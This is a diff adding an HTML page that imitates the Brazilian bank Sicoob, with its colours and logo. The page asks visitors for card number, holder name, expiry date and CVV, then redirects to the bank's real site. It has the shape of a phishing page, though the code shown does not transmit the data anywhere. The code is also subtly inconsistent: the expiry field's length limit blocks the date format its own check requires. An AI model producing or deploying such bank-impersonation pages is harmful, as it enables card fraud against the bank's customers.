@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sicoob - Dados do Cartão</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #006747; /* Fundo verde do Sicoob */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: white;
+        }
+
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            color: #333;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .header img {
+            width: 120px;
+            margin-bottom: 10px;
+        }
+
+        h1 {
+            color: #006747;
+            font-size: 24px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-group label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 5px;
+            color: #333;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .input-group input:focus {
+            border-color: #006747;
+            outline: none;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 10px;
+            background-color: #006747;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .btn-submit:hover {
+            background-color: #004b32;
+        }
+
+        .error {
+            color: red;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://logovtor.com/wp-content/uploads/2020/04/sicoob-vector-logo.png" alt="Logo Sicoob"> <!-- Logo Sicoob -->
+            <h1>Inserir Dados do Cartão</h1>
+        </div>
+        
+        <form id="cardForm">
+            <div class="input-group">
+                <label for="numeroCartao">Número do Cartão</label>
+                <input type="text" id="numeroCartao" name="numeroCartao" required maxlength="19" placeholder="Ex: 1234 5678 9012 3456">
+                <div id="numeroCartaoError" class="error"></div>
+            </div>
+            
+            <div class="input-group">
+                <label for="nomeTitular">Nome do Titular</label>
+                <input type="text" id="nomeTitular" name="nomeTitular" required placeholder="Ex: João da Silva">
+                <div id="nomeTitularError" class="error"></div>
+            </div>
+
+            <div class="input-group">
+                <label for="validade">Data de Validade</label>
+                <input type="text" id="validade" name="validade" required maxlength="5" placeholder="MM/AAAA">
+                <div id="validadeError" class="error"></div>
+            </div>
+
+            <div class="input-group">
+                <label for="cvv">CVV</label>
+                <input type="text" id="cvv" name="cvv" required maxlength="3" placeholder="Ex: 123">
+                <div id="cvvError" class="error"></div>
+            </div>
+            
+            <button type="submit" class="btn-submit">Confirmar</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById("cardForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            let isValid = true;
+
+            // Limpar mensagens de erro
+            document.getElementById("numeroCartaoError").textContent = '';
+            document.getElementById("nomeTitularError").textContent = '';
+            document.getElementById("validadeError").textContent = '';
+            document.getElementById("cvvError").textContent = '';
+
+            // Validar os campos
+            const numeroCartao = document.getElementById("numeroCartao").value.trim();
+            const nomeTitular = document.getElementById("nomeTitular").value.trim();
+            const validade = document.getElementById("validade").value.trim();
+            const cvv = document.getElementById("cvv").value.trim();
+
+            // Validar número do cartão (formato básico)
+            const numeroCartaoRegex = /^[0-9]{4}\s?[0-9]{4}\s?[0-9]{4}\s?[0-9]{4}$/;
+            if (!numeroCartao || !numeroCartaoRegex.test(numeroCartao)) {
+                document.getElementById("numeroCartaoError").textContent = 'Número do cartão inválido.';
+                isValid = false;
+            }
+
+            if (!nomeTitular) {
+                document.getElementById("nomeTitularError").textContent = 'Nome do titular é obrigatório.';
+                isValid = false;
+            }
+
+            // Validar data de validade (formato MM/AAAA)
+            const validadeRegex = /^(0[1-9]|1[0-2])\/\d{4}$/;
+            if (!validade || !validadeRegex.test(validade)) {
+                document.getElementById("validadeError").textContent = 'Data de validade inválida (MM/AAAA).';
+                isValid = false;
+            }
+
+            if (!cvv || cvv.length !== 3 || isNaN(cvv)) {
+                document.getElementById("cvvError").textContent = 'CVV deve ter 3 dígitos numéricos.';
+                isValid = false;
+            }
+
+            if (isValid) {
+                // Redireciona para o site do Sicoob após a validação
+                window.location.href = "https://www.sicoob.com.br";
+            }
+        });
+    </script>
+</body>
+</html>
